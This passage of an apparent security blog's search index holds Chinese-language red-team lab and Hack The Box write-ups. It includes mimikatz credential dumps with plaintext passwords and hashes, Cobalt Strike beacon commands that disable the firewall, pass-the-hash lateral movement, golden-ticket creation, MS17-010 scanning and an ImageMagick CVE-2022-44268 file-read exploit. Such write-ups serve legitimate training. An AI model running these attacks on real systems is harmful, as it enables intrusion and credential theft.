Password : 1qaz@WSX\n    wdigest :   \n     * Username : Administrator\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    kerberos :  \n     * Username : Administrator\n     * Domain   : de1ay.com\n     * Password : 1qaz@WSX\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 3289401 (00000000:00323139)\nSession           : Interactive from 2\nUser Name         : de1ay\nDomain            : DE1AY\nLogon Server      : DC\nLogon Time        : 2025/8/20 20:34:25\nSID               : S-1-5-21-2756371121-2868759905-3853650604-1001\n    msv :   \n     [00000003] Primary\n     * Username : de1ay\n     * Domain   : DE1AY\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 161cff084477fe596a5db81874498a24\n     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d\n    tspkg : \n     * Username : de1ay\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    wdigest :   \n     * Username : de1ay\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    kerberos :  \n     * Username : de1ay\n     * Domain   : DE1AY.COM\n     * Password : 1qaz@WSX\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 1657719 (00000000:00194b77)\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : WEB\nLogon Server      : WEB\nLogon Time        : 2025/8/20 20:12:50\nSID               : S-1-5-21-3767205380-3469466069-2137393323-500\n    msv :   \n     [00000003] Primary\n     * Username : Administrator\n     * Domain   : WEB\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 45a524862326cb9e7d85af4017a000f0\n     * SHA1     : 9de837c08728a5a6bef9e4721964b15ca3ffd969\n    tspkg : \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    wdigest :   \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    kerberos :  \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 638823 (00000000:0009bf67)\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : WEB\nLogon Server      : WEB\nLogon Time        : 2025/8/20 20:08:55\nSID               : S-1-5-21-3767205380-3469466069-2137393323-500\n    msv :   \n     [00000003] Primary\n     * Username : Administrator\n     * Domain   : WEB\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 45a524862326cb9e7d85af4017a000f0\n     * SHA1     : 9de837c08728a5a6bef9e4721964b15ca3ffd969\n    tspkg : \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    wdigest :   \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    kerberos :  \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 995 (00000000:000003e3)\nSession           : Service from 0\nUser Name         : IUSR\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025/8/20 20:08:08\nSID               : S-1-5-17\n    msv :   \n    tspkg : \n    wdigest :   \n     * Username : (null)\n     * Domain   : (null)\n     * Password : (null)\n    kerberos :  \n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 169087 (00000000:0002947f)\nSession           : Service from 0\nUser Name         : mssql\nDomain            : DE1AY\nLogon Server      : DC\nLogon Time        : 2025/8/20 20:07:28\nSID               : S-1-5-21-2756371121-2868759905-3853650604-2103\n    msv :   \n     [00000003] Primary\n     * Username : mssql\n     * Domain   : DE1AY\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 161cff084477fe596a5db81874498a24\n     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d\n    tspkg : \n     * Username : mssql\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    wdigest :   \n     * Username : mssql\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    kerberos :  \n     * Username : mssql\n     * Domain   : DE1AY.COM\n     * Password : 1qaz@WSX\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 133427 (00000000:00020933)\nSession           : Service from 0\nUser Name         : mssql\nDomain            : DE1AY\nLogon Server      : DC\nLogon Time        : 2025/8/20 20:07:15\nSID               : S-1-5-21-2756371121-2868759905-3853650604-2103\n    msv :   \n     [00000003] Primary\n     * Username : mssql\n     * Domain   : DE1AY\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 161cff084477fe596a5db81874498a24\n     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d\n    tspkg : \n     * Username : mssql\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    wdigest :   \n     * Username : mssql\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    kerberos :  \n     * Username : mssql\n     * Domain   : DE1AY.COM\n     * Password : 1qaz@WSX\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025/8/20 20:07:14\nSID               : S-1-5-19\n    msv :   \n    tspkg : \n    wdigest :   \n     * Username : (null)\n     * Domain   : (null)\n     * Password : (null)\n    kerberos :  \n     * Username : (null)\n     * Domain   : (null)\n     * Password : (null)\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : WEB$\nDomain            : DE1AY\nLogon Server      : (null)\nLogon Time        : 2025/8/20 20:07:13\nSID               : S-1-5-18\n    msv :   \n    tspkg : \n    wdigest :   \n     * Username : WEB$\n     * Domain   : DE1AY\n     * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 \n    kerberos :  \n     * Username : web$\n     * Domain   : DE1AY.COM\n     * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 \n    ssp :   \n    credman :   \n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#net-view6118","title":"\u6267\u884cnet view,\u53d1\u73b06118\u62a5\u9519","text":"<pre><code>beacon&gt; net view\n[*] Tasked beacon to run net view\n[+] host called home, sent: 105057 bytes\n[+] received output:\nList of hosts:\n\n\n[+] received output:\n Server Name             IP Address                       Platform  Version  Type   Comment\n -----------             ----------                       --------  -------  ----   -------\n[-] Error: 6118\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#shell-netsh-advfirewall-set-allprofiles-state-offnet-view","title":"\u4f7f\u7528<code>shell netsh advfirewall set allprofiles state off</code>\u5173\u95ed\u9632\u706b\u5899\u540e\u518d\u6b21\u6267\u884cnet view","text":"<pre><code>beacon&gt; shell netsh advfirewall set allprofiles state off\n[*] Tasked beacon to run: netsh advfirewall set allprofiles state off\n[+] host called home, sent: 74 bytes\n[+] received output:\n\u786e\u5b9a\u3002\n</code></pre> <pre><code>beacon&gt; net view\n[*] Tasked beacon to run net view\n[+] host called home, sent: 105057 bytes\n[+] received output:\nList of hosts:\n\n Server Name             IP Address                       Platform  Version  Type   Comment\n -----------             ----------                       --------  -------  ----   -------\n DC                      10.10.10.10                      500       6.3      PDC    \n WEB                     192.168.111.80                   500       6.1             \n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#show-targets-in-table-view","title":"\u70b9\u51fb<code>show targets in table view</code>\u6309\u94ae\uff0c\u67e5\u770b\u57df\u4e3b\u673a\u4fe1\u606f","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#10101010jump-psexechashsmb10101080session","title":"\u9009\u62e910.10.10.10\uff0c\u53f3\u952e\u70b9\u51fbjump -&gt; psexec,\u9009\u62e9hash,\u7136\u540e\u521b\u5efa\u4e00\u4e2asmb\u76d1\u542c\u4ece10.10.10.80\u4f5c\u4e3a\u8df3\u677f\u4f20\u56de\u6765\u7684session","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#dc_1","title":"\u6210\u529f\u4e0a\u7ebf\u57df\u63a7DC","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#_6","title":"\u6a2a\u5411\u6e17\u900f","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#192168111201","title":"\u626b\u63cf192.168.111.201","text":"<pre><code>\u2514\u2500$ nmap -sS -Pn -T4 -sV 192.168.111.201 --script=vuln\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 07:14 EDT\nNmap scan report for 192.168.111.201\nHost is up (0.075s latency).\nNot shown: 992 filtered tcp ports (no-response)\nPORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: DE1AY)\n3389/tcp  open  tcpwrapped\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\nMAC Address: 00:0C:29:85:D1:4D (VMware)\nService Info: Host: PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-vuln-ms17-010: \n|   VULNERABLE:                                                                             \n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)               \n|     State: VULNERABLE                                                                     \n|     IDs:  CVE:CVE-2017-0143                                                               \n|     Risk factor: HIGH                                                                     \n|       A critical remote code execution vulnerability exists in Microsoft SMBv1            \n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_smb-vuln-ms10-054: false\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 154.05 seconds\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#ms17-010msf-auxiliaryscannersmbsmb_ms17_010","title":"\u53d1\u73b0\u53ef\u80fd\u5b58\u5728ms17-010,\u4f7f\u7528msf <code>auxiliary/scanner/smb/smb_ms17_010</code>\u8fdb\u884c\u68c0\u6d4b","text":"<pre><code>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run\n[+] 192.168.111.201:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)\n/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression\n[*] 192.168.111.201:445   - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#ms17-010msf","title":"\u786e\u8ba4\u5b58\u5728ms17-010\uff0c\u5c1d\u8bd5\u5229\u7528msf \u8fdb\u884c\u6f0f\u6d1e\u653b\u51fb\uff0c\u5c1d\u8bd5\u591a\u4e2a\u5229\u7528\u65b9\u5f0f\u90fd\u5931\u8d25","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#dcsessionportscan-101010024-445-arp-200101010201pc","title":"\u5728DC\u7684session\u4e2d\u6267\u884c<code>portscan 10.10.10.0/24 445 arp 200</code>,\u7ec8\u4e8e\u626b\u63cf\u523010.10.10.201\uff08\u4e5f\u5c31\u662fPC\uff09","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#psexec-pc","title":"\u540c\u6837\u5229\u7528psexec \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\uff0c\u4e0a\u7ebfPC","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#_7","title":"\u76ee\u524d\u4e3a\u6b62\uff0c\u6240\u6709\u57df\u4e3b\u673a\u5747\u5df2\u4e0a\u7ebf","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#_8","title":"\u6743\u9650\u7ef4\u6301","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#hash","title":"\u83b7\u53d6\u57df\u63a7hash\u4e0e\u5bc6\u7801","text":"<pre><code>beacon&gt; hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: 82541 bytes\n[+] received password hashes:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::\nde1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::\nmssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::\nDC$:1002:aad3b435b51404eeaad3b435b51404ee:199cdf7694740292f436cc51b09f9355:::\nPC$:1105:aad3b435b51404eeaad3b435b51404ee:ce3e307123b59b4c481286308ae8fc2b:::\nWEB$:1603:aad3b435b51404eeaad3b435b51404ee:73805069e2c7227f110772875f1b0e41:::\n\nbeacon&gt; logonpasswords\n[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command\n[+] host called home, sent: 297594 bytes\n[+] received output:\n\nAuthentication Id : 0 ; 76818 (00000000:00012c12)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/8/21 19:35:39\nSID               : S-1-5-90-1\n    msv :   \n     [00000003] Primary\n     * Username : DC$\n     * Domain   : DE1AY\n     * NTLM     : 199cdf7694740292f436cc51b09f9355\n     * SHA1     : 2e173066a861825d5dc67a4a7a57c696a7c14f7d\n    tspkg : \n    wdigest :   \n     * Username : DC$\n     * Domain   : DE1AY\n     * Password : (null)\n    kerberos :  \n     * Username : DC$\n     * Domain   : de1ay.com\n     * Password : 2d 52 47 ff a5 15 08 f9 10 c0 8d 6d c8 28 cf cb 92 98 78 15 d5 12 42 9b f0 d5 e8 7a 58 cb 73 b8 de ad 2a 18 ca 62 0a 03 99 25 4c a1 46 42 26 b6 44 c7 84 d5 23 46 86 6d 1b 75 f7 1d 28 72 bf a6 6e 92 dd 9d e7 12 37 a0 65 b9 d6 e1 bb 29 4f bd f3 4b 80 fd 39 ec 10 21 30 43 01 33 88 03 ae 79 6b 59 a3 58 bd 06 21 8e fb 51 29 8c 8c f4 da 10 0f b5 bd 63 14 fd a6 14 8b f4 0a 15 f8 d9 d9 02 98 a4 cb af 89 3e 6d 49 f4 cf 53 25 74 61 ae 8d 16 74 33 12 d7 91 bc 5e 54 35 88 a6 1d e0 f4 0d 49 87 c1 af 94 2f 53 e3 92 43 89 ee 68 ce 06 bf 8b 0d ce 47 ec db 51 68 16 26 b3 ba 31 89 a5 59 3f 3e b8 57 02 c8 a1 80 e0 e9 af a0 4a a3 99 53 8e ec 3c 04 e3 3d a8 ea c1 aa c8 f3 e5 13 5d 4c c1 a6 f9 1d 14 74 63 e9 60 c1 5f 56 55 6a d0 0c \n    ssp :   KO\n    credman :   \n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : DC$\nDomain            : DE1AY\nLogon Server      : (null)\nLogon Time        : 2025/8/21 19:35:39\nSID               : S-1-5-20\n    msv :   \n     [00000003] Primary\n     * Username : DC$\n     * Domain   : DE1AY\n     * NTLM     : 199cdf7694740292f436cc51b09f9355\n     * SHA1     : 2e173066a861825d5dc67a4a7a57c696a7c14f7d\n    tspkg : \n    wdigest :   \n     * Username : DC$\n     * Domain   : DE1AY\n     * Password : (null)\n    kerberos :  \n     * Username : dc$\n     * Domain   : de1ay.com\n     * Password : 2d 52 47 ff a5 15 08 f9 10 c0 8d 6d c8 28 cf cb 92 98 78 15 d5 12 42 9b f0 d5 e8 7a 58 cb 73 b8 de ad 2a 18 ca 62 0a 03 99 25 4c a1 46 42 26 b6 44 c7 84 d5 23 46 86 6d 1b 75 f7 1d 28 72 bf a6 6e 92 dd 9d e7 12 37 a0 65 b9 d6 e1 bb 29 4f bd f3 4b 80 fd 39 ec 10 21 30 43 01 33 88 03 ae 79 6b 59 a3 58 bd 06 21 8e fb 51 29 8c 8c f4 da 10 0f b5 bd 63 14 fd a6 14 8b f4 0a 15 f8 d9 d9 02 98 a4 cb af 89 3e 6d 49 f4 cf 53 25 74 61 ae 8d 16 74 33 12 d7 91 bc 5e 54 35 88 a6 1d e0 f4 0d 49 87 c1 af 94 2f 53 e3 92 43 89 ee 68 ce 06 bf 8b 0d ce 47 ec db 51 68 16 26 b3 ba 31 89 a5 59 3f 3e b8 57 02 c8 a1 80 e0 e9 af a0 4a a3 99 53 8e ec 3c 04 e3 3d a8 ea c1 aa c8 f3 e5 13 5d 4c c1 a6 f9 1d 14 74 63 e9 60 c1 5f 56 55 6a d0 0c \n    ssp :   KO\n    credman :   \n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025/8/21 19:35:39\nSID               : S-1-5-19\n    msv :   \n    tspkg : \n    wdigest :   \n     * Username : (null)\n     * Domain   : (null)\n     * Password : (null)\n    kerberos :  \n     * Username : (null)\n     * Domain   : (null)\n     * Password : (null)\n    ssp :   KO\n    credman :   \n\nAuthentication Id : 0 ; 76853 (00000000:00012c35)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/8/21 19:35:39\nSID               : S-1-5-90-1\n    msv :   \n     [00000003] Primary\n     * Username : DC$\n     * Domain   : DE1AY\n     * NTLM     : f4279db634f00ca3f5777e0b854547ec\n     * SHA1     : cba60160e129a91eece1c9dea521671bb7edb688\n    tspkg : \n    wdigest :   \n     * Username : DC$\n     * Domain   : DE1AY\n     * Password : (null)\n    kerberos :  \n     * Username : DC$\n     * Domain   : de1ay.com\n     * Password : 5c 94 06 ab 7a 40 8e b2 34 66 7f 28 25 ed 49 d6 19 b9 83 99 dc 9f 5f 1d 9f 65 58 d4 f1 42 a8 6c 41 56 0e 22 1d ff c2 33 12 64 ac 33 c2 71 d8 80 62 09 2e 43 e2 fb 52 e1 b9 1a f8 b3 c5 84 f9 f9 ab 60 0f 6b 6f 86 57 b6 9f 12 c0 9c d4 33 8d bd a3 80 d5 de 59 80 2e d5 aa 65 fa 30 89 15 02 af 35 d1 a6 1b cb 28 19 49 77 44 b9 a0 67 e1 8f e6 63 74 8b 58 51 32 8b 88 6c 63 e9 22 76 3d d0 b3 b1 d1 00 c3 38 a1 8a 66 59 6d 48 55 32 19 0f 8c 5c 3d c0 de 72 bd 89 bb 11 41 6f be 15 9d 41 8f a2 9d be f1 90 52 1e 66 4f cf e8 5c 47 a8 96 06 2b 3a d1 5c ff c4 e9 77 0f 30 b4 2f 59 9f fc 21 79 22 06 c0 53 b3 9f 14 72 66 75 7c c4 3e a8 f9 be 8b 08 8c b0 d3 a0 6b da b9 d9 59 ae af f4 03 f4 18 76 d0 c9 bc 58 d1 42 d6 a9 5d a3 ae 84 81 \n    ssp :   KO\n    credman :   \n\nAuthentication Id : 0 ; 48427 (00000000:0000bd2b)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2025/8/21 19:35:38\nSID               : \n    msv :   \n     [00000003] Primary\n     * Username : DC$\n     * Domain   : DE1AY\n     * NTLM     : 199cdf7694740292f436cc51b09f9355\n     * SHA1     : 2e173066a861825d5dc67a4a7a57c696a7c14f7d\n    tspkg : \n    wdigest :   \n    kerberos :  \n    ssp :   KO\n    credman :   \n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : DC$\nDomain            : DE1AY\nLogon Server      : (null)\nLogon Time        : 2025/8/21 19:35:38\nSID               : S-1-5-18\n    msv :   \n    tspkg : \n    wdigest :   \n     * Username : DC$\n     * Domain   : DE1AY\n     * Password : (null)\n    kerberos :  \n     * Username : dc$\n     * Domain   : DE1AY.COM\n     * Password : (null)\n    ssp :   KO\n    credman :   \n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#sid","title":"\u83b7\u53d6\u57df\u63a7sid","text":"<pre><code>beacon&gt; shell wmic useraccount where name=\"administrator\" get sid\n[*] Tasked beacon to run: wmic useraccount where name=\"administrator\" get sid\n[+] host called home, sent: 82 bytes\n[+] received output:\nSID                                            \n\n\nS-1-5-21-2756371121-2868759905-3853650604-500  \n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#-access-golden-ticket","title":"\u5236\u4f5c\u91d1\u7968\u636e -&gt; \u53f3\u952eaccess-&gt;Golden Ticket","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#golden-ticket","title":"\u6210\u529f\u521b\u5efaGolden Ticket","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#dcc","title":"\u8bbf\u95ee\u57df\u63a7DC\u7684c\u76d8","text":""},{"location":"web/HTB%20Pilgrimage/","title":"HTB Pilgrimage","text":"<pre><code>\u2514\u2500$ sudo nmap -sS -sV -sC -Pn -T4 -A 10.10.11.219\n[sudo] password for kali: \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 20:04 CST\nNmap scan report for 10.10.11.219\nHost is up (0.11s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)\n|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)\n|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)\n80/tcp open  http    nginx 1.18.0\n|_http-title: Did not follow redirect to http://pilgrimage.htb/\n|_http-server-header: nginx/1.18.0\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=7/23%OT=22%CT=1%CU=38038%PV=Y%DS=2%DC=T%G=Y%TM=64BD176\nOS:D%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11\nOS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   110.99 ms 10.10.16.1\n2   110.99 ms 10.10.11.219\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 33.49 seconds\n</code></pre> <p>\u6dfb\u52a0\u76f8\u5e94\u7684hosts\u8bb0\u5f55</p> <pre><code>10.10.11.219    pilgrimage.htb\n</code></pre> <p></p> <p>\u626b\u63cfweb\u76ee\u5f55</p> <p></p> <p>\u4f7f\u7528githack\u5bfc\u51fa\u7ad9\u70b9\u6e90\u7801</p> <p></p> <p>\u67e5\u770b\u5176\u4e2d\u4e8c\u8fdb\u5236\u7a0b\u5e8f</p> <pre><code>\u2514\u2500$ ./magick -version\nVersion: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org\nCopyright: (C) 1999 ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(4.5) \nDelegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib\nCompiler: gcc (7.5)\n</code></pre> <p>\u53d1\u73b0\u662fImageMagick 7.1.0-49\uff0c\u67e5\u627e\u53d1\u73b0\u5b58\u5728CVE-2022-44268\u6f0f\u6d1e\uff0c\u5982\u4e0b</p> <p></p> <p>\u5c1d\u8bd5\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c<code>https://github.com/Sybil-Scan/imagemagick-lfi-poc</code></p> <p>\u751f\u6210\u4e00\u4e2a\u5e26\u6076\u610f\u547d\u4ee4\u7684\u56fe\u7247\u5e76\u4e0a\u4f20\uff0c\u7b49\u5230\u5b58\u5728\u6f0f\u6d1e\u7684ImageMagick\u7a0b\u5e8f\u6267\u884c\u547d\u4ee4\u540e\uff0c\u518d\u4e0b\u8f7d\u88ab\u8f6c\u6362\u540e\u5305\u542b\u6709\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u7684\u56fe\u7247\u5230\u672c\u5730\u8fdb\u884c\u89e3\u6790</p> <p>\u5ba1\u8ba1\u4ee3\u7801\u53ef\u4ee5\u53d1\u73b0\u5728\u767b\u5f55\u6210\u529f\u8df3\u8f6c\u9996\u9875\u540e\u4f1a\u8fde\u63a5\u6570\u636e\u5e93<code>$db = new PDO('sqlite:/var/db/pilgrimage');</code></p> <p>\u5219\u751f\u6210\u5982\u4e0b\u547d\u4ee4\u56fe\u7247</p> <p></p> <p>\u63a5\u4e0b\u6765\u5f00\u59cb\u5229\u7528\u6f0f\u6d1e</p> <p>\u8bfb\u53d6\u4e0b\u8f7d\u7684\u6587\u4ef6</p> <p><code>identify -verbose 64bd24f347fd2.png</code></p> <p>\u4f7f\u7528CyberChef\u89e3\u7801\u8bfb\u53d6\u7684\u6570\u636e<code>https://gchq.github.io/CyberChef</code></p> <p></p> 